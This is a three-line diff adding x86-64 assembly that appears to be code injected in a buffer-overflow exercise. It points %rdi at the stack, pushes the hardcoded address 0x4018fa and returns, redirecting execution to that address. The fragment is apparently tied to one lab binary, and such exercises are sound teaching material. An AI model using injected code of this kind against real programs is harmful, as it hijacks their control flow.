@@ -1,0 +1,3 @@
+leaq (%rsp), %rdi
+push $0x4018fa
+retq
